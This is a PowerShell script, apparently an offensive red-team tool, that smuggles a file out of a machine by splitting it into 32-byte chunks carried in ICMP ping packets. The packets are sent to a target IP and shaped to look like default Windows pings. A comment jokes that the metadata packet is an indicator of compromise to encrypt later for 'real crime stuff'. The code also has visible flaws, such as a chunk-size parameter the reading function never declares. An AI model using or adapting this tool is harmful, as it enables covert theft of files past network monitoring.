# Author: Dahvid Schloss a.k.a APT Big Daddy
# Email: dahvid.schloss@echeloncyber.com
# Date: 04-03-2024
# Update: 4-16-2024
# Patch Notes: Added in a better way of exiting issues so it doesn't close the terminal. Also made it so the script will find the CWD and att it to the file path. 
# Description: Designed for transmitting files over ICMP by breaking them into manageable chunks to emulate a windows default ping

Add-Type -AssemblyName System.Net
Add-Type -AssemblyName System.Net.NetworkInformation

# Function to read file in 32 byte chunks we use 32bytes as the layer 1-3 section of the ICMP packet is 32 bytes and by default microsoft sends ping packets at 64 bytes per packet
function Read-FileInChunks {
    param (
        [string]$FilePath
    )

    try {
        $Chunks = @()
        $CWD = $PSScriptRoot
        $CWDfilePath = Join-Path -Path $CWD -ChildPath $FilePath
        $FileStream = [System.IO.File]::OpenRead($CWDfilePath)
        $Buffer = New-Object byte[] $ChunkSize
        while ($FileStream.Read($Buffer, 0, $ChunkSize) -gt 0) {
            $Chunks += , $Buffer.Clone() # Clone buffer to avoid overwriting
        }
        $FileStream.Close()
        return $Chunks
    }
    catch [System.IO.FileNotFoundException] {
        Write-Host "Error: File '$FilePath' not found."
        return
    }
    catch {
        Write-Host "Error reading file: $_"
        return
    }
}


#dat good good
Function Run-Pilot{
    param(
        [string]$targetIP = "127.0.0.1",
        [string]$filePath,
        [int]$chunksize = 32,
        [int]$delay = 0
    )

    # Read file in chunks
    try{$chunks = Read-FileInChunks -FilePath $filePath -ChunkSize $chunksize}
    Catch{return}

    #count the CHUNKS
    $totalChunks = $chunks.Count

    # Create ICMP echo request packet
    $icmpPacket = New-Object System.Net.NetworkInformation.Ping

    # Prepare the first packet with file information to transfer. This is an IOC could probably encrypt it but that comes later when the real crime stuff happens (J/K Special Agent Mendez I gave up that life)
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileType = [System.IO.Path]::GetExtension($filePath)
    $fileInfo = "FileName: $fileName`nFileType: $fileType`nTotalChunks: $totalChunks"
    $paddingSize = 64 - [System.Text.Encoding]::ASCII.GetByteCount($fileInfo)
    if ($paddingSize -gt 0) {
        $padding = [char]::ToString([char]::MinValue) * $paddingSize  # Padding with null characters
        $firstPacket = $fileInfo + $padding
    } else {
        $firstPacket = $fileInfo.Substring(0, 64)  # Trim if info is too long
    }

    # Send the first packet
    Write-Host -NoNewline "Sending file information... "
    $response = $icmpPacket.Send($targetIP, 1000, [System.Text.Encoding]::ASCII.GetBytes($firstPacket))
    if ($response.Status -eq "Success") {
        Write-Host "Success"
    } else {
        Write-Host "[!]Failed - Aborting Transfer"
        return
    }

    # Send each chunk in an ICMP packet and wait for response
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkNumber = $i + 1
        Write-Host -NoNewline "Sending chunk $chunkNumber of $totalChunks... "

        $response = $icmpPacket.Send($targetIP, 1000, $chunks[$i])
        if ($response.Status -eq "Success") {
            Write-Host "Success"
        } else {
            Write-Host "[!]Failed - Aborting Transfer"
            return
            
        }

        # Here is my shit delay funciton which i find hilarious 
        Start-Sleep -Milliseconds $delay
    }
}
